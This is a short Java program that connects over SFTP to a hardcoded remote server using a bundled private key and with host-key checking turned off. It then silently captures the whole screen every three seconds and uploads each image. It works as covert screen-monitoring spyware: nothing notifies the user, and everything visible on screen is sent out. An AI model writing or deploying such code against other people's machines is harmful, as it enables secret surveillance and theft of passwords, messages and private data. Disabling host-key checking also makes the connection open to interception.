/*
 * @author DBOne
 * CREDITS: JCraft/JSCH Library
 */
package default_package;

import com.jcraft.jsch.ChannelSftp;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import com.jcraft.jsch.SftpException;
import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import javax.imageio.ImageIO;

public class Main {

    private static final int SCREENSHOT_OPERATION_DELAY = 3000; //Miliseconds   

    private static final int SERVER_PORT = 22;
    private static final String SERVER_USERNAME = "ubuntu";
    private static final String SERVER_HOSTNAME = "13.53.200.132";
    private static final String SSH_AUTHENTICATION_KEY_PATH = "key/AWSEC2Key.pem";

    private static ChannelSftp SFTPChannel;

    private static final String IMAGE_UPLOAD_DIRECTORY_PATH = "/home/ubuntu/screenshots/";

    public static void main(String[] args) throws AWTException, IOException, JSchException {

        connectToServer();
        
        screenCapture();

    }

    private static void screenCapture() {

        ScheduledExecutorService executorService = Executors.newSingleThreadScheduledExecutor();
        executorService.scheduleAtFixedRate(() -> {

            try {
                BufferedImage image = new Robot().
                        createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));

                String imageName = "Screenshot_" + getCurrentDateAndTime() + ".png";

                ByteArrayOutputStream imageToBytes = new ByteArrayOutputStream();
                ImageIO.write(image, "png", imageToBytes);

                uploadImageToServer(imageName, imageToBytes);

            } catch (Exception exception) {
                System.out.println("Screen Capture Exception: " + exception.getMessage());
            }
        }, 0, SCREENSHOT_OPERATION_DELAY, TimeUnit.MILLISECONDS);

    }

    public static String getCurrentDateAndTime() {
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd-HH-mm-ss");
        LocalDateTime localDateTimeInstance = LocalDateTime.now();
        return formatter.format(localDateTimeInstance);
    }

    private static void connectToServer() throws JSchException {
        JSch jschObject = new JSch();

        jschObject.addIdentity(SSH_AUTHENTICATION_KEY_PATH);

        Session session = jschObject.getSession(SERVER_USERNAME, SERVER_HOSTNAME, SERVER_PORT);

        session.setConfig("StrictHostKeyChecking", "no");
        session.connect();

        SFTPChannel = (ChannelSftp) session.openChannel("sftp");
        SFTPChannel.connect();

    }

    private static void uploadImageToServer(String imageName, ByteArrayOutputStream imageToBytes) throws SftpException {
        InputStream inputStream = new ByteArrayInputStream(imageToBytes.toByteArray());
        SFTPChannel.put(inputStream, IMAGE_UPLOAD_DIRECTORY_PATH + imageName);

    }
}
